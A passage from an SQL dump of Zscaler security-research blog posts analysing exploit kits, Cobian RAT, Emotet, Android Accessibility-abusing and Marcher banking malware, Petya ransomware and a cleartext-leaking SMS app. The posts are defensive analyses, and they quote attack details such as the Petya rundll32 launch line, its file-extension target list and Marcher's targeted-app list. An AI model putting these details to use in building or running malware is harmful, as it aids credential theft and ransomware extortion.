exploit kit that first appeared in early August. It shares code with Terror EK and uses the same URL pattern, but has many distinct features.    The Disdain campaign we’ve observed is delivered via a gate that is also distributing the RIG EK. Many of the gate domains in this campaign use the format \"campngay##\" with a two-character top-level domain. The referrers to the malicious gates were from malvertising networks and unauthorized movie streaming sites.        Figure 13: Hits for \"campngay\" campaign, August 2017    Disdain has been observed using the exploits CVE-2013-2551, CVE-2015-2419, CVE2016-0189, and CVE-2017-0059.    Trend Micro has published an analysis of Disdain EK here.    Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of a user to access their files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as these, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using the Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-summer-2017');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (56, 'Cobian RAT – A backdoored RAT', 'Abhaykant Yadav,', 'August 31, 2017', 'Introduction\r\n\r\nThe Zscaler ThreatLabZ research team has been monitoring a new remote access Trojan (RAT) family called Cobian RAT since February 2017. The RAT builder for this family was first advertised on multiple underground forums where cybercriminals often buy and sell exploit and malware kits. This RAT builder caught our attention as it was being offered for free and had lot of similarities to the njRAT/H-Worm family, which we analyzed in this report.\r\n\r\n   \r\n\r\n   Figure 1: Cobian RAT command-and-control server application\r\n\r\nAs shown in Figure 1, the Cobian RAT control panel and features are similar to that of njRAT and H-Worm. It is noteworthy that the author identified njRAT as the “theme.”\r\n\r\nCrowdsourcing botnet model?\r\n\r\nAs we analyzed the builder, we noticed a particularly interesting function: the builder kit is injected with a backdoor module which retrieves C&C information from a predetermined URL (pastebin) that is controlled by the original author. This allows the original author to control the systems infected by the malware payloads that were generated using this backdoored builder kit.\r\n\r\n\r\n\r\nFigure 2 (click to enlarge): Crowdsourced botnet model – Cobian RAT\r\n\r\nAs shown in Figure 2, the original author of the RAT builder kit is relying on second-level operators to build the RAT payload and spread infections. Then, thanks to the backdoor module, the original author can take full control of infected systems across all the Cobian RAT botnets in which the operators used the backdoored builder kit. The original author can also change the C&C server information configured by the second-level operators.\r\n\r\nEvading detection by malware operator\r\n\r\nDuring our analysis, we observed that when the machine name and username of the systems running the Cobian RAT payload (bot client) and the control server (bot C&C server) are the same, the backdoor module will not be activated and no communication will be sent to the backdoor C&C server.\r\n\r\nThe original author of the RAT builder is assuming that there will be some testing performed by the second-level operators and that they will mostly likely use the same system for both bot client and server applications (C&C server of 127.0.0.1). To hide the presence of the backdoor module, there will be no traffic generated from the bot client to the backdoor C&C server in this case.\r\n\r\nRecent in-the-wild Cobian RAT payload analysis\r\n\r\nWe saw a unique Cobian RAT payload hit our Cloud Sandbox from a Pakistan-based defense and telecommunication solution website (potentially compromised). The executable payload was served inside a ZIP archive and was masquerading as a Microsoft Excel spreadsheet using an embedded icon, as shown in Figure 3.\r\n\r\n  \r\n\r\nFigure 3: Cobian RAT payload masquerading as Microsoft Excel spreadsheet file\r\n\r\nThe executable payload is signed with an invalid digital certificate pretending to be from VideoLAN (Figure 4), creator of the well-known VLC media player.\r\n\r\n   \r\n\r\nFigure 4: Invalid digital certificate pretending to be from VideoLAN\r\n\r\nThe executable file is packed using a .NET packer with the encrypted Cobian RAT payload embedded in the resource section. There is a series of anti-debugging checks performed by this dropper payload before decrypting the RAT and installing it on the victim’s system. The decompiled version of the RAT payload can be seen in Figure 5 below:\r\n\r\n   \r\n\r\nFigure 5: Cobian RAT — unpacked and decompiled\r\n\r\nThe bot’s configuration details are present in Class B’s constructor as shown below:\r\n\r\n   \r\n\r\nFigure 6: Bot configuration details\r\n\r\nThe bot attempts to create a MUTEX using the value of variable “VL” to ensure that only one instance of the bot is running. The bot will proceed to create a copy of itself as %TEMP%/svchost.exe, execute that file, and terminate itself. The newly executed copy will create an autostart registry key to ensure persistence upon system reboot.\r\n\r\nThe bot contains many features that are also present in the njRAT, such as:\r\n\r\n\r\n	Keylogger\r\n	Screen capture\r\n	Webcam\r\n	Voice recorder\r\n	File browser\r\n	Remote command shell\r\n	Dynamic plugins\r\n	Install/Uninstall\r\n\r\n\r\n \r\n\r\nNetwork C&C activity\r\n\r\nThe bot will spawn two threads in the background, one of which will be responsible for ensuring persistence and taking screenshots. The second thread will perform a regular check-in with the remote C&C server.

The Zscaler Threat Research team has been monitoring the new variant of Emotet since April 2017 and has recently seen a spike in Emotet related spam activity.\r\n\r\n\r\n\r\nEmotet is a multi-component malware which specializes in a multitude of nefarious activities, including stealing credentials from browsers and mail clients, banking theft via Man-in-the-Browser attack, email harvesting and propagation through spam emails from infected systems.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 1.

As reported here, in April Emotet was mainly distributed via JavaScript malspam campaigns, whereas the attackers are now leveraging malicious document files with highly obfuscated macro to serve the emotet payload.\r\n\r\n\r\n\r\nObfuscated VBS macro code contains predetermined URLs with code to download and install Emotet payload on the victim machine. As seen in the de-obfuscated VBS macro code (Figure 3), the downloaded binary is stored in “%Temp%“ directory with random integer value.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 3: De-obfuscated VBS macro code\r\n\r\n\r\n\r\nEmotet Payload\r\n\r\n\r\n\r\nThe downloaded executable is packed with a  custom packer which has encrypted data hiding the Emotet executable and the code to load it. When executed, this data is decrypted in the memory using a custom algorithm involving “Base-64 decode” and “XOR”. A new process is created in suspended mode and the decrypted Emotet binary is written in the address space of this process.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nFigure 4: Pseudo code of decryption algorithm used to decrypt Emotet and Code to load it.\r\n\r\n\r\n\r\nWhen control is handed over to the new process, it creates a copy of itself in “C:\\windows\\system32\\” with the filename created by appending two strings from a predetermined set of hard-coded strings (Figure 5). The combination of strings is picked based on “volume serial number” of infected system’s volume.\r\n\r\n\r\n\r\nExample filenames can be seen below:  \r\n\r\n\r\n\r\nlookuprpc.exe\r\n\r\n\r\n\r\nhomeservice.exe\r\n\r\n\r\n\r\nprovidernvidia.exe”\r\n\r\n\r\n\r\nThe malware also creates a system service for the dropped executable.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 5: List of hard-coded strings used for filename\r\n\r\n\r\n\r\nOnce the service is started, CreateTimerQueueTimer Windows API is invoked and it’s Callback function is used to periodically trigger core malicious code that is responsible for communication with the Command & Control (C&C) servers, send collected information, and wait for a commands from the server.\r\n\r\n\r\n\r\nUpon successful infection, Emotet registers the compromised host with the C&C server by sending information such as computer name, CPU architecture and OS version, as well as a list of active processes and whether they were executed with administrator privilege.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nFigure 6. Data sent to C&C server upon successful infection\r\n\r\n\r\n\r\nThe malware uses API calls “RtlGetVersion” and “GetNativeSystemInfo” to fetch system information as seen in Figure 6. A “dword” is baked out of values returned by these API calls which contains values: processor architecture, OS type, OS version and Service pack.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nFigure 7: Code for collecting system information.\r\n\r\n\r\n\r\nCollected information is encrypted and sent to the C&C server using HTTP POST request with UserAgent “Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)”.\r\n\r\n\r\n\r\nThe malware polls for a new command every 15 minutes and if the C&C server doesn’t reply, it will try to contact the next server from the hard-coded list of server.

But on August 21, one sample triggered a special alert, because it was shown to be available on Google Play.\r\n\r\nThe name of app is \'Earn Real Money Gift cards\'  (package name: com.moneygift.real.app), and we confirmed it as a variant of a widely known BankBot malware family. As we extended our investigation to the author of this app, we came across a second app uploaded by the same author, entitled \'Bubble Shooter Wild Life\' (package name: com.bubblesooter.wildlife). The payload, however, was not a BankBot; it turned out to be a downloader Trojan that is abusing the Google Play Accessibility Service.\r\n\r\n“Accessibility services should only be used to assist users with disabilities in using Android devices and apps”, according to the Google Android Developer Guide.\r\n\r\nUpon preliminary analysis of \'Bubble Shooter Wild Life\', we were able to confirm it to be malicious and capable of abusing Android\'s Accessibility permission to install additional apps without user\'s permission.

Most recent malware families have started using obfuscators, packers, and protectors to hinder analysis from security researchers and malware detection systems. Since most of the code strings were obfuscated, we decided to write a routine to decrypt all the strings and rebuild the APK. Once we got the strings in plain text, the analysis was straightforward.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                                Fig. 2: Obfuscated strings\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n			 \r\n		\r\n		\r\n			                                                                               Fig. 3: De-Obfuscated Strings\r\n			 \r\n		\r\n	\r\n\r\n\r\nFig.3 shows that the app registers a service, which will be triggered after 1200000 milliseconds — or 20 minutes. This might be one of the reasons why Google Bouncer couldn\'t detect this app.\r\n\r\nDetail workflow:\r\n\r\n\r\n	\r\n	Once the app is started, it asks permission to draw over other apps for the user to play the game.\r\n	\r\n	\r\n	The malicious routine in the background waits for 20 minutes before triggering the malicious service.\r\n	\r\n	\r\n	After 20 minutes, it repeteadly shows system alert disguised as a message from the Android OS (Fig. 4).\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                      Fig. 4\r\n		\r\n	\r\n\r\n\r\n4. When the user clicks OK, the malware opens the Accessibility Settings menu, where the user can see that “Google Service” is turned off. What the user sees is actually the malware’s accessibility service designed to mimic a service from Google.

If the user clicks on the “Google Service” menu, it displays a toggle button to activate the service with a description. This is another tactic designed to trick the user by copying Google’s original Privacy & Terms from https://www.google.com/policies/terms.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                       Fig. 6\r\n		\r\n	\r\n\r\n\r\nThe text, which looks to be from Google, is stored in the app itself. (Fig. 7)\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                                                                   Fig. 7\r\n		\r\n	\r\n\r\n\r\n6. When users try to enable the service, they see the list of services required. Considering the techniques used by the malware author to this point, the user is most likely going to accept these permissions and press OK, giving the Accessibility permission to the malware app. (Fig. 8)\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                       Fig. 8\r\n		\r\n	\r\n\r\n\r\n7. As soon as the app gets Accessibility permission, it checks for a /sdcard/Download/app.apk file. However, for some reason in our review, it didn’t download this file. But for the sake of analysis, to see what would have happened if there was an app.apk file in the Download section, we kept a random APK file with the same name at that location. The malware abused the accessibility service to install that APK file automatically. First it tried to install the APK directly, but it turned out that the installation failed because the “Installation from Unknown Sources” was disabled. So, the app itself opened the Settings menu, turned on “Installation from Unknown Source” and then restarted the app.apk installation process. It accepted all the permissions of the app and completed the app installation successfully.\r\n\r\nConclusion\r\n\r\nWe have previously identified numerous instances of malicious apps hiding on Google Play and leveraging techniques like time delays and code obfuscation. However, this app’s abuse of the Google Accessibility service to install additional payloads without user’s permission is unique. While the apps in this analysis are fairly new on Google Play with fewer than 5000 downloads, we are concerned about the increase in the availability of dubious apps in the store. As a first line of defense, we recommend that consumers also increase the caution with which they download apps.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/malware-google-play-abusing-accessibility-service');

It\'s available across 820 mobile networks in 220+ countries for a price far lower than the cost of a regular mobile plan. While most plans would charge upwards of 60 cents for an international SMS message, SMS touch charges a flat rate of 9 cents, without any roaming or international charges, allowing the user to recover the purchase price of the app in fewer than 5 texts.\r\n\r\nCost isn\'t the only reason why users choose the app.  SMS touch is also popular among people, especially kids, that don\'t have cellular plans, as the app allows them to use their iPod touch or other such devices to send text messages in any Wi-Fi zone. However, while SMS touch presents an economical choice for consumers, it still may come at too high a cost. \r\n\r\nRecently our ThreatLabZ team discovered that the app sends customer information and SMS messages over a cleartext network, presenting malicious actors the perfect opportunity to intercept login credentials as well as gain access to messages that may contain private information.\r\n\r\nVulnerability:\r\n\r\nWhen users begin to create an account, they are presented with the following screen.\r\n\r\n                                                                Fig 2: Registration\r\n\r\nOnce the user selects \"Create account,\" the app asks for a username and email address.  \r\n\r\n                                                                Fig 3: Registration\r\n\r\nAfter the user has entered all the registration information, the app creates a request to the server and sends the user’s details. In response to this request, the server sends a PIN to be used for login.\r\n\r\n\r\n\r\n                                Fig 4: Request to server and response with login PIN.\r\n\r\nDuring login, the app automatically supplies the PIN and email to the server as shown below.\r\n\r\n\r\n\r\n                                                                 Fig 5: Login screen\r\n\r\nUpon clicking “Login,” the user\'s ID and PIN are sent to the app’s server in plain text. Observe below.\r\n\r\n  Fig 6: During login, user\'s ID and PIN are sent to the app’s server in plain text\r\n\r\nThe username and password can be easily spoofed by an attacker, given that the information is sent to the server in cleartext.\r\n\r\nThe following image displays the SMS texting screen.\r\n\r\n\r\n\r\n                          Fig 7: Send SMS with text in the app\'s message screen\r\n\r\nOnce the user clicks \"Send,\" the app also sends the SMS content to the server over a cleartext network channel, as shown below.\r\n\r\n\r\n\r\nFig 8: SMS content is sent to the server over a cleartext network channel\r\n\r\n\r\nMany users send sensitive information over SMS, similar to the example shown above. This data can easily be accessed by an outsider simply tapping in to the application’s network. We witnessed such a transaction in the Zscaler cloud with a user of this app. See below.\r\n\r\n\r\n\r\n\r\nFig 9: SMS information sent in cleartext, observable in the Zscaler cloud\r\n\r\nConclusion:\r\n\r\nThe list of mobile applications in Google Play and the iTunes App Store that transmit sensitive information in cleartext continues to grow. In our research report entitled  “Are mobile apps a leaky tap in Enterprise?,” we found that 0.5% of transactions from iOS and 0.3% of transactions from Android platforms have some level of privacy leakage. \r\n\r\nA study by IBM & The Ponemon Institute shows that of 400 companies studied, almost 40 percent do not scan the apps they develop for security vulnerabilities. Of those that do scan their apps before releasing them to market, only 15 percent test them as frequently as they should. And, even more worrisome, 50 percent of those that develop mobile apps do not allocate any budget at all to testing for security vulnerabilities. Thus, leaky apps are created and users of such apps are unaware that their private data is at risk of exposure.\r\n\r\nEven though SMS touch is a paid app, it fails to accommodate standard code security practices. Encryption is absolutely necessary to protect user information and to prevent privacy leakage. \r\n\r\nNote: We reached out to the developer of the SMS touch app about this issue. They were prompt to acknowledge the issue and committed to releasing a patch by the end of this year.', '', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-sms-touch');

Zscaler operates a globally distributed cloud security platform, and we have found that more than half of all internet traffic sent through our cloud is encrypted. Some of that traffic still uses the older Secure Sockets Layer (SSL) protocol, while a higher percentage uses the newer Transport Layer Security (TLS) protocol. Sessions for both are invoked with the “HTTPS” website address prefix in your browser. Because Zscaler examines the contents of all encrypted traffic to detect malicious payloads, we have discovered that encryption is frequently used to mask malware and evade security detection tools. In this security brief, we’ll present some of the statistics and trends that our researchers have compiled regarding major malware families, and we’ll describe actions you can take to protect your organization against these threats.\r\n\r\nThe Rising Use of Encryption for Malware\r\n\r\nEncryption has always been used to protect sensitive data transmitted through the internet, but its use has increased to the point where most traffic today is encrypted. Google reported that by the end of 2016, 80 percent of traffic sent across its properties was encrypted.\r\n\r\nWhile encryption is effective for protecting data, it also is effective for hiding malicious payloads. During 2017, an average of 60 percent of the threats detected in the Zscaler global cloud had been encrypted with SSL/TLS, and we’ve been blocking an average of 600,000 encrypted malicious activities every day. In the last six months, we’ve observed that encrypted malicious content has more than doubled.\r\n\r\nCurrent Trends in Encrypted Malware\r\n\r\n1.  Attack types vary\r\n\r\nAmong the 600,000 encrypted incidents blocked each day by the Zscaler cloud, we have seen a variety of attack types hidden within SSL/TLS packets. They primarily include: \r\n\r\n\r\n	Exploit kits \r\n	Malware\r\n	Adware\r\n	Malware callbacks\r\n\r\n\r\n2.  Web exploits abuse public trust\r\n\r\nCybercriminals continue abusing public trust to accomplish their goals, which are primarily profit driven. For example, the attack type using SSL/TLS-enabled advertising networks injects malicious scripts into legitimate websites. When users visits a legitimate website that serves the infected advertisements, they unwittingly fall prey to malware, which can steal their personal information or corrupt their data.\r\n\r\nCybercriminals are also abusing free SSL/TLS providers. The free certificates enable HTTPS support on the attackers’ malicious domains, allowing them to bypass SSL/TLS integrity checks in web browsers. This configuration also creates problems for organizations that are unable to monitor SSL traffic, as they must rely on less effective techniques like IP and domain blocking in an attempt to identify and block threats delivered from such domains.\r\n\r\nZscaler is currently detecting an average of 10,000 web exploits delivered over SSL/TLS each month.\r\n\r\n3.  Phishing continues to evade network perimeter tools\r\n\r\nHackers are posting phishing pages on legitimate domains that they have compromised. Many of these legitimate sites support SSL/TLS, and there are very few network security solutions that can support inspection of encrypted packets at scale. During 2017, Zscaler has blocked an average of 12,000 phishing attempts per day delivered over SSL/TLS, an increase of 400 percent over 2016.\r\n\r\n4.  Malware families are using SSL/TLS for callback activity\r\n\r\nThe use of encryption has increased the sophistication of callback design. It used to be rare to see SSL/TLS used for command-and-control (C&C) activity. But since encryption is now ubiquitous, attackers have decided to join the party and hide inside encrypted packets. Anonymity services like TOR also help to hide C&C servers. Botnets are also using SSL/TLS more frequently, including the use of self-signed certificates along with the names and corresponding information of real companies. The prevalence of this scheme is on the rise. During 2017, Zscaler has blocked an average of more than 5,000 C&C attempts over SSL/TLS per day.\r\n\r\n5.  Distribution of malware families using encryption for C&C\r\n\r\nC&C communication is a critical function for malware, and cybercriminals are relying on encryption more than ever to hide the implementation of an attack. Figure 1 shows the distribution of malware families using encryption for C&C activity, based on unique, new payloads that have been seen in Zscaler Cloud Sandbox during 2017.', 'Malware', 'https://www.zscaler.com/blogs/research/ssltls-based-malware-attacks');

Figure 2: Initial infection and propagation         Technical Analysis of the Payload    We analyzed two unique payloads from this attack, both of which were Windows Dynamic-Link Library (DLL) files. These DLLs have an export function without a name; it is invoked using the ordinal value “#1” as shown below:      	<System32>\\rundll32.exe \"%s\",#1      It is also important to note that these files were recently compiled as shown in the screenshot below:        Figure 3: Recently compiled DLL payload    Once executed, the ransomware payload will perform the following activity on the victim\'s machine:      	There is a check in the ransomware routine to look for an infection marker, which, if found, will terminate the execution. This essentially serves as a killswitch for the ransomware payload, preventing further propagation within the network:      ​​       Infection Marker or Killswitch file => C:\\Windows\\MalwareDLLFileName  where MalwareDLLFileName is the name of main DLL      	  	The malware looks for files with following extension on the user machine and encrypts them:  	             .3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora           The encrypted files will have same extension as before.                        Figure 4: Enumerating files for encryption      	If the user is logged in with administrator privileges, the malware payload will also encrypt the Master Boot Record (MBR) and essentially make the system unusable upon system reboot  	   	  	The malware then creates a scheduled task to reboot the infected system as seen below:  	                               Figure 5: Scheduled task to reboot the system in one hour      	Once the system reboots, the infamous ransom note appears, demanding $300 in Bitcoins  	                          Figure 6: Ransom note      	  	The delay in rebooting the compromised system and showing the ransom note is probably done to provide a complete hour for the spreading module to propagate laterally in the network without any indication to the end user  	  	  	We are still analyzing the propagation module but as previously reported, there is a new propagation vector involving WMIC which is possibly the reason this attack has been successful  	                        Figure 7: Leveraging WMIC for lateral movement      	  	We did not observe any network C&C activity associated with these samples  	      Conclusion    WannaCry started a new era of ransomware variants weaponized with a  mechanism for lateral movement. Petya authors went one step further by adding the WMI interface vector and we expect to see more variants in the coming months.

We have observed Marcher evolving over time, using new tricks and payload delivery mechanisms. As we reported about previous encounters with this malware here, here, and here, the authors are using new techniques to spread infections, such as pornographic lures and the hype around new games.    In a recent wave, we are seeing the malware payloads disguised as Adobe Flash player. Upon opening the dropper URL, the user will be prompted by a message saying the device’s Flash Player is out of date, and the malware “Adobe_Flash_2016.apk” will be dropped on the user’s device. The malware will also guide the user to disable security and allow third-party apps to install, as shown in the screen below.        Fig 1: Payload delivery    We saw multiple payloads being served where popcash.net ads were the initial source of infection.          Fig 2: New Android Marcher wave    Upon installation, the malware quickly hides and removes its icon from the phone menu.    Following infection, the malware will register the infected device to its Command & Control (C&C) server. Along with the device’s meta information, the installed apps list is sent to the C&C server as shown below.        Fig 3: C&C communication       After a few sleep cycles, the malware waits for the user to open an app from its targeted list. We found that this variant is capable of targeting over 40 financial apps. When the user opens any of the targeted apps, the malware will quickly overlay a fake login page, which lures the victim into supplying user credentials. Some of the overlay pages are shown below.          Fig 4: Fake login pages     Unlike Marcher malware we’ve seen in the past, this variant maintains a JavaScript Object Notation (JSON) file that lists each targeted app and its fake login page hosting URL. This list is hardcoded in the malware payload. A screen capture is shown below.          Fig 5: Targeted apps list with the associated URLs that serve the overlay pages    The following is a list of financial apps targeted by the new Marcher variant:      	com.android.vending  	org.morgbigorg.nonem  	com.google.android.gm  	com.yahoo.mobile.client.android.mail  	com.htc.android.mail  	com.android.email  	com.paypal.android.p2pmobile  	com.chase.sig.android  	com.suntrust.mobilebanking  	com.wf.wellsfargomobile  	com.citi.citimobile  	com.konylabs.capitalone  	com.infonow.bofa  	com.morganstanley.clientmobile.prod  	com.amazon.mShop.android.shopping  	com.htsu.hsbcpersonalbanking  	com.usaa.mobile.android.usaa  	com.schwab.mobile  	com.americanexpress.android.acctsvcs.us  	com.pnc.ecommerce.mobile  	com.regions.mobbanking  	com.clairmail.fth  	com.grppl.android.shell.BOS  	com.tdbank  	com.huntington.m  	com.citizensbank.androidapp  	com.usbank.mobilebanking  	com.key.android  	com.ally.MobileBanking  	com.unionbank.ecommerce.mobile.android  	com.mfoundry.mb.android.mb_BMOH071025661  	com.bbt.cmol  	com.sovereign.santander  	com.mtb.mbanking.sc.retail.prod  	com.fi9293.godough  	com.circle.android  	com.coinbase.android  	com.walmart.android  	com.bestbuy.android  	com.gyft.android  	com.commbank.netbank  	org.westpac.bank  	au.com.nab.mobile  	org.stgeorge.bank  	com.facebook.katana  	com.moneybookers.skrillpayments  	com.westernunion.android.mtapp  	au.com.ingdirect.android  	au.com.bankwest.mobile  	org.banksa.bank  	com.ebay.mobile  	com.ebay.gumtree.au  	com.anz.android.gomoney  	com.anz.android      Unlike other Marcher malware, this variant is highly obfuscated, which explains the low antivirus (AV) detection rate. The VirusTotal screen capture below shows that less than 20 percent of AV scanners detected the new variant (at the time of the scan).    VT: 11/59 (at the time of analysis)        Fig 6: VT detection             Fig 7: Obfuscated code     The overlay (fake) login pages for the financial apps are hosted remotely, allowing the author to update them as needed. In the sample C&C communication shown below, the user on the infected device tries to launch the Commonwealth Bank of Australia app; it gets intercepted by the Marcher Trojan, which loads an overlay login page from a remote location.        Fig 8: Serving fake page in server response    If the user falls for the fake login page and enters his or her banking credentials, the Marcher Trojan relays the information to the C&C server, as shown in the screenshot below.        Fig 9: Credential harvesting    Conclusion    We have been seeing regular infection attempts for this Marcher variant in the past month. The frequent changes in the Marcher family indicate that the malware remains an active and prevalent threat to Android devices.    To avoid being a victim of such malware, be sure to download apps only from trusted app stores, such as Google Play. By unchecking the \"Unknown Sources\" option under the \"Security\" settings of your device, you can prevent inadvertent downloads from questionable sources.

An exploit kit (EK) is a rapidly deployable software package designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors.\r\n\r\nThrough spring 2017, we have seen several significant changes in various exploit kits\' structure and distribution. The RIG EK maintains its position as the most active exploit kit, serving a variety of ransomware payloads. Traffic to the Sundown, KaiXin, and Terror EKs all fell, though the latter two remain active. Magnitude EK has shown a slight increase in visibility, targeting users in Southeast Asia with a malvertising campaign.\r\n\r\nYou can find our previous roundup here.\r\n\r\nRIG Exploit Kit\r\n\r\nRIG remains the most active exploit kit, although overall traffic has been marginally decreasing over the past several months. RIG is still a primary distributor of various ransomware payloads, and we have recently observed it dropping cryptocurrency mining software.\r\n\r\n\r\n\r\nFigure 1: RIG EK instances blocked, March 2017 – June 2017\r\n\r\n\r\n\r\nFigure 2: RIG EK landing server geo distribution\r\n\r\nThe distribution of RIG hosts remains fairly similar, although the activity we observed last quarter in Southeast Asia and South America was absent this quarter.\r\n\r\nRecently, we observed a campaign originating from malicious script injections on compromised sites that dropped both Cerber ransomware and a Bitcoin mining payload.\r\n\r\n\r\n\r\nFigure 3: RIG EK compromised site injection\r\n\r\nIn our previous roundup, we saw that the Terror EK was dropping ccminer, a cryptocurrency mining suite, onto victim computers. It appears that other exploit kit users are now incorporating that same method in parallel with ransomware payloads in order to generate additional revenue.\r\n\r\nAnother campaign with some unique features was observed in late May. This campaign is primarily targeting adult-themed sites.\r\n\r\n\r\n\r\nFigure 4: RIG EK gate\r\n\r\nThis campaign uses the same browser fingerprinting script that we’ve seen in many RIG campaigns, but the landing page URL uses a newer, atypical pattern that was first observed in early March. This campaign is using the new URI parameters fix, yus, and ct.\r\n\r\n\r\n\r\nFigure 5: RIG EK session\r\n\r\nThis campaign drops the Dreambot banking Trojan, as well as a Tor library to use for post-infection command and control. Support for Tor functionality was incorporated into Dreambot last year.\r\n\r\nRIG temporarily stopped serving SWF exploits at the beginning of April, causing some independent researcher to suppose that the exploit kit authors had given up on using Flash exploits. During this time, the EK relied on browser exploits such as the ubiquitous CVE-2016-0189. However, several days later, RIG resumed serving SWF exploits.\r\n\r\nMost recently, RIG was subject to a takedown campaign headed by RSA, targeting campaigns using shadowed domains (https://blogs.rsa.com/shadowfall/).\r\n\r\nMagnitude Exploit Kit\r\n\r\nMagnitude EK is one of the longest-running exploit kits. It has been active since late 2013, although it has had a relatively low volume of traffic over the last year.\r\n\r\nDuring our last roundup, we noted that Magnitude was primarily targeting Southeast Asian countries with a malvertising campaign dropping Cerber ransomware. The campaign has continued throughout this quarter, running advertisements for Forex investment, gaming websites, porn sites, and fake shopping portals.\r\n\r\n\r\n\r\nFigure 6: Magnitude EK instances blocked, March 2017 - June 2017\r\n\r\n\r\n\r\nFigure 7: Magnitude EK cycle\r\n\r\nWhen the malvertising content is viewed, the victim is served a HTTP 302 redirect which sends the user to a Magnitude gate.\r\n\r\n\r\n\r\nFigure 8: Magnitude EK gate redirect\r\n\r\nThe gate serves obfuscated JavaScript, which contains the final redirect to the exploit kit landing page\r\n\r\n\r\n\r\nFigure 9: Malicious page delivered by the ad network\r\n\r\n\r\n\r\nFigure 10: Deobfuscated script\r\n\r\nSome landing pages in this campaign track client IP addresses, preventing multiple exploit chains from being served to the same IP.\r\n\r\nThe Flash exploit payload performs a version fingerprinting check, returning the client OS and Flash version number. This information is sent back to the Magnitude server.\r\n\r\n\r\n\r\nFigure 11: Magnitude Flash fingerprinting\r\n\r\nAfter fingerprinting, Magnitude infects the victim with Cerber ransomware.\r\n\r\nThis campaign targets users in Taiwan but filters out connections from other Southeast Asian countries, such as South Korea. If the client is not in the targeted region, the exploit kit delivers a blank page instead of the exploit.\r\n\r\nTerror Exploit Kit\r\n\r\nThe Terror EK is a newer exploit kit that appeared to be cobbled together from pieces of Metasploit payloads as well as other EKs, most notably Sundown and Hunter. It still employs Sundown exploit packages, though some large changes have been made to the infection cycle. The exploit kit evolved from its old carpet bombing techniques to a more selective technique that uses fingerprinting during the exploit chain.\r\n\r\nLike many other exploit kits, the Terror EK cycle begins with a malicious script injection. In this case, Terror uses a very simple character replacement obfuscation method.\r\n\r\n\r\n\r\nFigure 12: Terror EK obfuscated script injection\r\n\r\n\r\n\r\nFigure 13: Terror EK deobfuscated redirect\r\n\r\nThe IFrame URL serves a HTTP 302 redirect, which sends the client to the Terror landing page. The user is fingerprinted and information collected from the user is sent back as a POST request.\r\n\r\n\r\n\r\nFigure 14: Terror EK fingerprinting data\r\n\r\nThe information collected includes the URL of the compromised website from which the user is being redirected, the compromised site, and version information of Silverlight, ActiveX, QuickTime, PDF, Java, and Flash plugins.\r\n\r\nIn response, the server tries to load exploit CVE-2016-0189 and CVE-2016-2419 as shown below:\r\n\r\n\r\n\r\nFigure 15: Terror EK CVE-2016-0189\r\n\r\n\r\n\r\nFigure 16: Terror EK CVE-2016-2419\r\n\r\nPayloads dropped by the Terror EK include Win32/Tofsee, Smoke Loader, Andromeda and cryptocurrency miners.\r\n\r\nOther Exploit Kits\r\n\r\nNeutrino Exploit Kit\r\n\r\nThe Neutrino EK returned this winter after shutting down nearly all traffic in late September 2016. During that time, RIG replaced Neutrino as the primary distributor for CryptXXX ransomware. Since Neutrino’s return, it has remained steadily active, though low in volume compared to its pre-shutdown traffic.\r\n\r\nKaiXin Exploit Kit\r\n\r\nKaiXin EK activity has declined and remains targeted to Asian websites. No significant changes have been made to the exploit kit structure. Current campaigns are propagating via compromised sites, and are still infecting users with bundled Chinese adware packages.\r\n\r\nSundown Exploit Kit\r\n\r\nIn late winter, Sundown EK traffic declined sharply, and the exploit kit has shown very little traffic since March.\r\n\r\nConclusion\r\n\r\nExploit kits are insidious, because they’re widely available and relatively cheap, this makes it easy to launch malware attacks on unsuspecting users. New Exploit Kits surface all the time with different attack vectors, new targets, and broader reach. Exploit Kit authors keep changing the fingerprinting and infection techniques to evade security products and researchers from analyzing their kits. As seen in this roundup, RIG remains one of the most prevalent exploit kit being used along with few other smaller Exploit kit players in the market.\r\n\r\nThe ThreatLabZ research team actively tracks coverage for these exploit kits and their payloads, ensuring protection for organizations using Zscaler cloud-delivered Internet security.\r\n\r\nResearched by Derek Gooley and Rohit Hegde', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-spring-2017');
